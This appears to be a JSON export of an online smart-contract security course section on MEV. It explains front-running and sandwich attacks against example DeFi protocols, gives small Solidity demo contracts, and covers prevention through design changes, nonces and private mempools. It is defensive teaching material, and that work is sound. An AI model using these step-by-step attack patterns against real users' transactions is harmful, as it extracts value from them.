          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/4-mev-minimized/+page.md",
          "markdownContent": "---\ntitle: MEV - Minimized\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# MEV - Minimized\n\nWe can take a look at this image to see a minimized visual representation of what MEV looks like. In specific, this kind of MEV is known as \"front-running\".\n\n<img src=\"/security-section-8/4-mev-minimized/minimized.png\" style=\"width: 100%; height: auto;\" alt=\"regular transaction\">\n\n# MEV - Everywhere\n\nBut not only that, ALL of our sections in the security course have been vulnerable to MEV attacks! Let's go over them...",
          "updates": []
        },
        {
          "lessonId": "a8e7cd03-4078-468e-8bd1-6daaa2e043cc",
          "number": 5,
          "title": "MEV: Puppy Raffle",
          "slug": "mev-in-puppy-raffle",
          "folderName": "5-mev-in-puppy-raffle",
          "description": "",
          "duration": 2,
          "videoUrl": "pVn6Z3G3nmIHmvlHnGCS00hVmBHpjkPUBn02m8zoMDMdk",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/5-mev-in-puppy-raffle/+page.md",
          "markdownContent": "---\ntitle: MEV - Minimized\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# Front Running\n\n## The Puppy Raffle Demo\n\nOur Puppy Raffle's core function is `selectWinner`, which allows users to select a winner in any given transaction. While this `selectWinner` transaction is in flight (pending confirmation), it is readable by other parties involved in the transaction. This means they can potentially see that the impending winner is user A (let's call them MevBot for the sake of argument) and then strategize accordingly.\n\n```javascript\nfunction selectWinner() { // Winner selection codewinner = User A\n```\n\n## When Front Running Strikes\n\n<img src=\"/security-section-8/5-puppy-mev/puppy-mev.png\" style=\"width: 100%; height: auto;\" alt=\"puppy raffle mev\">\n\nImagine user B - let's call them the Frontrunner - realizing that they're not about to win the raffle. Naturally, they may not want to continue participating in it. Sensing impending loss, Frontrunner springs into action.\n\n*A simple plan*: Before the `selectWinner` transaction goes through, they initiate another function - `refund` - which allows them to pull out their betted money.\n\n```javascript\nfunction refund() {// Refund code// User B pulls out their betted money}\n```\n\nThey are essentially saying, '*No, not on my watch! I'm getting my refund.*' And voila, Frontrunner's transaction gets refunded, while the `selectWinner` function will eventually be executed resulting in (User A) receiving less money. Why? Because Frontrunner (User B) had effectively front-run them and withdrew their betted money!\n\n## The Full Example: Implications of Front Running\n\nLet's add some numbers to visualize this more clearly:\n\n1. Let's say the Puppy Raffle has a total of 10 ETH.\n2. Frontrunner sees that User A is about to win.\n3. Frontrunner and all their peers launch their own transactions to call the `refund` function, effectively withdrawing a substantial portion of the betted money.\n4. Suddenly, there are only 1 ETH left in the pool, instead of the initial 10 ETH.\n5. Finally, the `selectWinner` transaction goes through, and MevBot ends up with a meager prize of 1 ETH instead of the expected 10 ETH.\n\nHere, front running literally robs User A of their full winnings. Frontrunner â€” observing the transaction in the mempool and acting just in time â€” was able to drastically alter the outcome.\n\n> \"The ability to 'spy' on pending transactions opens up the possibility for opportunists to front-run your transactions. They can swiftly act in ways that are in their favor but can potentially be detrimental to others, as the 'Puppy Raffle' scenario demonstrates.\"",
          "updates": []
        },
        {
          "lessonId": "a1e5c3a3-9f17-46f0-9146-32b2842cd63f",
          "number": 6,
          "title": "MEV: TSwap",
          "slug": "mev-t-swap",
          "folderName": "6-mev-t-swap",
          "description": "",
          "duration": 2,
          "videoUrl": "V3x8jRm79qgJUvw01SHO91EuBX2W1ARtHp4obLRTnOog",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/6-mev-t-swap/+page.md",
          "markdownContent": "---\ntitle: MEV - T-Swap\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n## Exploring the T Swap Issue\n\nWhile working with T swap, there was a prominent issue that surfaced - an issue which was rooted right in the `deposit` function. The problematic player at hand was an unused `deadline` parameter.\n\nTo find the culprit, we navigated to the `SRC` and inspected the `TswapPool.sol` in T swap, where we saw the troublesome `deadline` input parameter laying idly in the `deposit` function.\n\n```javascript\n    function deposit(\n        uint256 wethToDeposit,\n        uint256 minimumLiquidityTokensToMint,\n        uint256 maximumPoolTokensToDeposit,\n        uint64 deadline\n    )\n```\n\nAnd, you ask, what was the consequence of this unutilized parameter? Well, its existence led to a scenario where a deposited transaction could potentially be delayed without encountering a timeout, thereby enabling 'front running'. \n\nA node who receives this transaction could hold your deposit transaction until it benefits them to deposit you in!\n\n## Understand the Impact: An Simple Illustration\n\n<img src=\"/security-section-8/6-tswap-mev/t-swap-mev.png\" style=\"width: 100%; height: auto;\" alt=\"t-swap mev\">\n\nLet's understand the implications with an example. Suppose a user, 'User A', initiates a `deposit` call. However, this call was sent to a particular node connected to an MEV bot, let's call this 'User B'.\n\nThe node, upon receiving the transaction, realizes that the deposit from 'User A' would dwindle its share in the pool. Just by chance, it also knows of certain larger imminent transactions, which will result in big fees. Therefore, the node chooses to stall the transaction from 'User A' temporarily, permitting 'User B' or the MEV bot to collect the big fees â€“ effectively front running 'User A'.\n\n## Introducing 'Sandwich attacks'\n\nBeyond just front running, there are worst forms of deceiving manoeuvres - one such issue that potentially arises in T swap is known as 'Sandwich attacks'. These are when someone front-runs you, and then also \"back runs\" you.\n\n```\n-> Their Transaction\n-> Your Transaction\n-> Their Transaction\n```\n\nThey \"sandwich\" you between two of their transactions. One such example looks like such:\n\n1. You send a TX to buy 1 ETH for 1,000 DAI\n2. An MEV bot sees this:\n   1. Buys up all the ETH, pumping the price to 2,000\n   2. Your transaction goes through, buying 1 ETH for 2,000 DAI\n   3. They then sell their ETH for it's inflated price \n\nSeeing your big order of 1 ETH come in, the MEV bot manipulated the market so you paid more, and they profited. ",
          "updates": []
        },
        {
          "lessonId": "0435db83-e395-44dd-9c86-07fd2c736a43",
          "number": 7,
          "title": "MEV: ThunderLoan",
          "slug": "mev-thunder-loan",
          "folderName": "7-mev-thunder-loan",
          "description": "",
          "duration": 2,
          "videoUrl": "gxPmR02VCgIdep12CnS6OxSh4Lcl2C801uHO2WI4hF02bU",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/7-mev-thunder-loan/+page.md",
          "markdownContent": "---\ntitle: MEV - Thunder Loan\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\nSpeaking of Sandwich Attacks, that's exactly what happens in the Thunder Loan protocol. \n\n## An Introduction to Thunderloan and Potential MEV Issues\n\nThe Thunderloan protocol is a platform where users can take out flash loans, with a fee currently standing at ten USDC. These fees are directly withdrawn from TSWAP pools. However, the protocol's design makes it susceptible to MEV strategies. \n\n## The Sandwich Attack: A Closer Look\n\n<img src=\"/security-section-8/7-mev-thunder-loan/thunder-loan-mev.png\" style=\"width: 100%; height: auto;\" alt=\"t-swap mev\">\n\n\nHere's how it goes:\n\n1. User A makes a request to the Thunderloan protocol for a flash loan.\n2. Seeing the incoming flash loan request, User B, decides to exploit the situation. User B doesn't just want the fee to be high, they want it way higher!\n3. User B then front runs the flash loan function, and spikes the price on Uniswap by taking out a flash loan *themselves* to make the price go higher. Effectively, this swap alters the balances from the initial ten USDC and one ETH to highly skewed figures: perhaps 0.1 ETH and an astronomical amount of USDC (let's say a billion). Since the fee is derived from the T-Swap pool, the Thunder Loan platform now has a way bigger fee, that the user wasn't aware of. \n4. Then, after collecting the fee, User B swaps back to the original ratio of 10 USDC and 1 ETH.\n\n## The Takeaway\n\n> \"Understanding the landscape of MEV vulnerabilities, and how it can lead to 'Sandwich Attacks,' is paramount for DeFi users. Only by identifying potential threats can we begin to devise methods to avoid being sandwiched.\"\n\nThe above exploration of the potential MEV issue in Thunderloan paints a broader picture of potential vulnerabilities in DeFi protocols. By shining light on this issue, we can aspire to ensure safer transactions and reduce the adverse impacts of MEV exploits.\n",
          "updates": []
        },
        {
          "lessonId": "0856ee94-ef38-45d1-91a3-0b56194b3338",
          "number": 8,
          "title": "MEV: BossBridge",
          "slug": "mev-boss-bridge",
          "folderName": "8-mev-boss-bridge",
          "description": "",
          "duration": 1,
          "videoUrl": "Y00YoudniEn00sg01LlzRWNA2OFBUdTxipEXJh001NPQ9vE",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/8-mev-boss-bridge/+page.md",
          "markdownContent": "---\ntitle: MEV - Boss Bridge\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n## MEV - Boss Bridge\n\nNow you're starting to see the picture, and the Boss Bridge MEV becomes clear. \n\n<img src=\"/security-section-8/8-mev-boss-bridge/mev-boss-bridge.png\" style=\"width: 100%; height: auto;\" alt=\"boss bridge mev\">\n\nIf you send a transaction with your signature on-chain, someone can easily see that transaction in the mempool, and then send their own transaction with your signature!\n\n## Prevention\n\nTo prevent this, we can do something similar to the Signature Replay protection, where we add a nonce, make sure the first time it's called with the signer, etc. \n\n",
          "updates": []
        },
        {
          "lessonId": "db99bec6-0e4b-4b88-88b1-af410e917a5d",
          "number": 9,
          "title": "MEV: LIVE",
          "slug": "mev-live",
          "folderName": "9-mev-live",
          "description": "",
          "duration": 12,
          "videoUrl": "MRpS3YaA1Tczbj5qZ1006xq01GcSFosgwmb3wUUS8LgcI",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/9-mev-live/+page.md",
          "markdownContent": "---\ntitle: MEV - LIVE\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# Now, we are going to watch a video of me getting front-ran, LIVE\n\nHere is [the code we are going to use to see it](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Frontran.sol)\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\ncontract FrontRan {\n    error BadWithdraw();\n\n    bytes32 public s_secretHash;\n\n    event success();\n    event fail();\n\n    constructor(bytes32 secretHash) payable {\n        s_secretHash = secretHash;\n    }\n\n    function withdraw(string memory password) external payable {\n        if (keccak256(abi.encodePacked(password)) == s_secretHash) {\n            (bool sent,) = msg.sender.call{value: address(this).balance}(\"\");\n            if (!sent) {\n                revert BadWithdraw();\n            }\n            emit success();\n        } else {\n            emit fail();\n        }\n    }\n\n    function balance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n```\n\nWatch the video to see:\n1. Me get front-ran\n2. How we prevent it with [Flashbots Protect](https://docs.flashbots.net/flashbots-protect/overview)\n",
          "updates": []
        },
        {
          "lessonId": "2a8ee81a-1be3-46f5-ba4e-cca550526af3",
          "number": 10,
          "title": "MEV: Live AGAIN",
          "slug": "mev-live-again",
          "folderName": "10-mev-live-again",
          "description": "",
          "duration": 6,
          "videoUrl": "tt022yw1eZE34rM01tk5ffoQEMrVE6vw9ZnsEyjrRRBjQ",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/10-mev-live-again/+page.md",
          "markdownContent": "---\ntitle: MEV - Live AGAIN!\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# Can we obfuscate the transaction?\n\nSo, a lot of people saw me do this and started to theorize.\n\n- \"Hey, could we obfuscate the transaction?\"\n- \"What if there was another contract in the way?\"\n- \"What if it was written in assembly?\"\n\nAnd I'm here to tell you, it doesn't matter. The bots simulate the transaction, and pick out the parts they can use to make money. \n\nWe look at a [modified example](https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/MEV/Bouncer.sol) where we add a \"bouncer\" contract to try to \"block\" the transactions.\n\n<img src=\"/security-section-8/10-bouncer/bouncer.png\" style=\"width: 100%; height: auto;\" alt=\"bouncer\">\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\ninterface IFrontRan {\n    function withdraw(string memory password) external;\n}\n\ncontract Bouncer {\n    error Bouncer__NotOwner();\n    error Bouncer__DidntMoney();\n\n    address s_owner;\n    address s_frontRan;\n\n    constructor(address frontRan) payable {\n        s_owner = msg.sender;\n        s_frontRan = frontRan;\n    }\n\n    function go(string memory password) external {\n        if (msg.sender != s_owner) {\n            revert Bouncer__NotOwner();\n        }\n        IFrontRan(s_frontRan).withdraw(password);\n        (bool success,) = payable(s_owner).call{value: address(this).balance}(\"\");\n        if (!success) {\n            revert Bouncer__DidntMoney();\n        }\n    }\n\n    receive() external payable {}\n}\n```\n\nSo, watch the video above to see, will this contract help block the MEV bots? ",
          "updates": []
        },
        {
          "lessonId": "f89212c6-f10f-42ec-a5f1-cdfeccb54041",
          "number": 11,
          "title": "Case Study: Pashov",
          "slug": "case-study-pashov",
          "folderName": "11-case-study-pashov",
          "description": "",
          "duration": 24,
          "videoUrl": "CVVQOfXFAO01PFuY5YC01L73sxl2AqmLSmeBZZ026W2azM",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/11-case-study-pashov/+page.md",
          "markdownContent": "---\ntitle: MEV Case Study - Pashov\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\nTo walk us through some real-world reports where MEV was reported, we have guest lecturuer [Pashov](https://twitter.com/pashovkrum) to walk us through! \n\n\n<img src=\"/security-section-8/11-pashov/pashov.png\" style=\"width: 100%; height: auto;\" alt=\"pashov\">",
          "updates": []
        },
        {
          "lessonId": "1323222f-b81d-4173-b237-f43b130d3042",
          "number": 12,
          "title": "MEV: Prevention",
          "slug": "mev-prevention",
          "folderName": "12-mev-prevention",
          "description": "",
          "duration": 4,
          "videoUrl": "Bl73cdulINgQh4sc3J4xoxLUcJ300qaxmp2MXb00NvlZM",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/12-mev-prevention/+page.md",
          "markdownContent": "---\ntitle: MEV - Prevention\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n## Designing For Protection\n\nOur first line of defense against MEV is to refine our designs. To illustrate this, let's revisit a puppy raffle sample.\n\nWe can shield our raffle from this kind of attack by updating our Solidity code. A simple solution would be to introduce a function, like `endRaffle`, which signifies the completion of the raffle. Once a raffle is `ended` it will enter a new state, where no one can refund or do anything until a winner is picked. Hereâ€™s an example of how we can incorporate additional protections into our smart contract:\n\n<img src=\"/security-section-8/12-mev-prevention/endRaffle.png\" style=\"width: 100%; height: auto;\" alt=\"pashov\">\n\n\nOur contract now includes a `refund` function that checks if the raffle has ended - if it has, it reverts the function, making it impossible for users to refund their bets after peeking into the mempool.\n\n## Private or Dark Mempool\n\nWhen the designs have been beefed up, the next step to consider is the use of a private or \"dark\" mempool, such as [Flashbots Protect](https://docs.flashbots.net/flashbots-protect/overview), MEV Blocker, or a secure RPC.\n\n<img src=\"/security-section-8/12-mev-prevention/flashbots.png\" style=\"width: 100%; height: auto;\" alt=\"pashov\">\n\nInstead of submitting your transaction to a public mempool, you can send your transaction to this private mempool. Unlike the public mempool, this keeps the transaction for itself until it's time to post it on the chain.\n\nDespite its pros, the private mempool requires you to trust that it will maintain your privacy and avoid front-running. Another downside is the slower transaction speed. If you're curious, you can observe this in action by adding an RPC from Flashbots Protect to your MetaMask.\n\n\n\nAs security experts, we should always be advising protocols how they can defend their users against MEV. ",
          "updates": []
        },
        {
          "lessonId": "d66d4e52-3711-4f09-b765-2a6ea6df136d",
          "number": 13,
          "title": "MEV: Recap",
          "slug": "mev-recap",
          "folderName": "13-mev-recap",
          "description": "",
          "duration": 2,
          "videoUrl": "ohCKCC01cUCNlj0202cS36Z4TDdSi01SgvfGuNcLkuOAvQk",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/13-mev-recap/+page.md",
          "markdownContent": "---\ntitle: MEV - Prevention\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# Understanding Mev and How to Mitigate Its Impact\n\nMev refers to the potential reward that a miner, node, or bot could glean from ordering transactions. They often use the information of what's coming from the mempool to make those ording choices. \n\n## Types of Mev Attacks\n- Front-running\n- Backrunning\n- Sandwich \n- Many more...\n\nThere are various ways through which Mev can be exploited to benefit the entity spotting the transaction. Some of the most common types of Mev attacks include:\n\n- *Front Running*: This occurs when an entity spots a pending transaction and then acts quickly to execute another transaction before the victim transaction hits. \n- *Sandwich Attacks*: Similar to front running, this involves an attacker boxing in a user's transaction with their transactions on either side. \n\n## Protecting Against Mev Attacks\n\nWhile the realities of Mev can be daunting, there are ways to mitigate its impact:\n\n1. **Better Design** â€“ Constructing the transaction in a manner that makes it harder for bots to gain useful knowledge. This might involve masking critical information or employing other strategic measures.\n2. **Use of Private RPC or Dark Pools** â€“ These are networks that allow transactions to be processed outside of the public mempool. Services such as Flashbots Protect, Mev Blocker, and Secure RPC play an essential role in this regard.\n\nWe should note that Mev is not some mythical concept â€“ it does have real-world consequences on the Ethereum blockchain. I have witnessed firsthand the material impact of it, even losing real money in the process.\n\n> quoted text\"**Mev bots are real, and they are actively scouting for any opportunity to make money. Consequently, understanding how Mev works and how to protect against it is crucial for anyone operating within the blockchain landscape**.\"\n\nSo, having read this blog post, you should now have a solid grasp of Mev. Here's to smarter and better-secured transactions on the blockchain!\n",
          "updates": []
        },
        {
          "lessonId": "ceb58aa9-58d3-4503-aff4-92ad38a9b4f6",
          "number": 14,
          "title": "Governance Attack: Intro",
          "slug": "governance-attack-intro",
          "folderName": "14-governance-attack-intro",
          "description": "",
          "duration": 7,
          "videoUrl": "SR9klB02AgWU02OnuYturXAzUwDhG1rz5YwUewUW6mRbI",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/14-governance-attack-intro/+page.md",
          "markdownContent": "---\ntitle: Governance Attack - Introduction\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\nFor this one, sit back and relax as Cyfrin's own [Juliette](https://twitter.com/_juliettech) gives us a walkthrough of governance attacks from a high level. ",
          "updates": []
        },
        {
          "lessonId": "1a7f7d59-f971-4aa0-8085-58514c7f818e",
          "number": 15,
          "title": "Case Study: Bean",
          "slug": "case-study-bean",
          "folderName": "15-case-study-bean",
          "description": "",
          "duration": 20,
          "videoUrl": "5BnEkscLdV3LgCWXHZFHmaQMIxTHFFO1MxUOXox5OOo",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/15-case-study-bean/+page.md",
          "markdownContent": "---\ntitle: Case Study - Bean\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\nAnd now, we have guest lecturer and fellow course creator [JohnnyTime](https://twitter.com/RealJohnnyTime) to walk us through a real-world case study of a governance attack in action.\n\nYou can read more about the [Bean attack in Rekt.](https://rekt.news/beanstalk-rekt/)",
          "updates": []
        },
        {
          "lessonId": "224db888-298d-4ee2-8c67-15fc3cb6eff3",
          "number": 16,
          "title": "End Part 1",
          "slug": "end-part-1",
          "folderName": "16-end-part-1",
          "description": "",
          "duration": 10,
          "videoUrl": "4jQ4wHrFAm2RLQCut16euCCa7JoidyrfDGeonxwGe8U",
          "rawMarkdownUrl": "/routes/security/8-mev-and-governance/16-end-part-1/+page.md",
          "markdownContent": "---\ntitle: End of Part 1\n---\n\n_Follow along with this video:_\n\n<!-- TODO -->\n\n\n---\n\n# Congratulations on Nailing Part One of the Security Curriculum: Here's What's Next\n\nHey, friends. Great to see you again. What a journey it's been so far!\n\nGetting through the first part of this majorly intense curriculum deserves a massive round of applause. We've covered a variety of crucial topics. From `Mev signature replays` and `reentrancy attacks`, we've gone over the `audit process`, to `stateful fuzzing`. We've also touched on interesting concepts like `invariants`, `arbitrage`, `DeFi`, `borrowing and lending`, `flash loans`, and much more.\n\nIn just completing the last five security reviews, you've not only established a formidable portfolio but also demonstrated that persistent practice pays off. Remember: repetition is the mother of skill.\n\n\n## You got this\n\nAnd here is the thing, we've just trained you on the EXACT process the professionals do. So you know how to do this!!\n\n## The Game Plan\n\n**1. Scoping**\n\nBegin with scope identification. Determine what you're working with - the commit hash, the compatibilities, the chains, and the tokens.\n\n**2. High-Level Analysis**\n\nNext, aim to understand what the code is supposed to achieve. Read the documentation, discuss with the team, make diagrams, take notes. Dump all your thoughts down on paper.\n\n**3. Code Comprehension**\n\nTime to dive into the code. Itâ€™s okay if you donâ€™t find anything at first â€“ that's normal. Simply aim to interpret the code. Ask yourself: Is the code doing what the protocol intends it to do?\n\n**4. Identifying Vulnerabilities**\n\nYour final mission is the most challenging - finding vulnerabilities. Use your checklist for guidance, looking for any weird ERC20s or potential MEV.\n\n## Testing Your Skills\n\nThe Vault Guardians code base offers greater complexity than any previous codebases. Embrace this new level of difficulty. Seize this opportunity to test your prowess in the face of adversity.\n\nMy suggestion to you: team up with a peer. This vault presents numerous bugs and issues for you to uncover, which will help build your confidence and improve your bug-finding skills.\n\n**And remember: do not proceed to part two just yet.**\n\n## A Valuable Detour\n\nNow, it's time. You have 2 options. \n\n\\**Option 1: Compete in a real competitive audit on platforms like Code Hawks. The excitement of the competition will keep you on edge and the real code base is sure to test all your abilities*.\n\n\\*\\*Option 2: Pair up and tackle the Vault Guardians codebase as a learning experience.\n\n## To Recap:\n\n1. First of all, great job! By just getting this far, you outdo more than 70% of the current security landscape.\n2. Do not move to part two yet. Either try your hand at a Code Hawks competitive audit or complete the Vault Guardians audit with a partner.\n\nRemember your security journey is far from over. Part two is where we (will) dig even deeper into assembly, EVM, formal verification, and more. \n\nSo... We are looking forward to seeing you back for Part 2 after you try your hand at either Vault Guardians or Code Hawks.\n\nGood luck!!",
          "updates": []
        }
      ]
    }
  ],
  "createdAt": "2023-12-18T15:14:18.691Z",
  "updatedAt": "2023-12-18T15:14:18.691Z"
}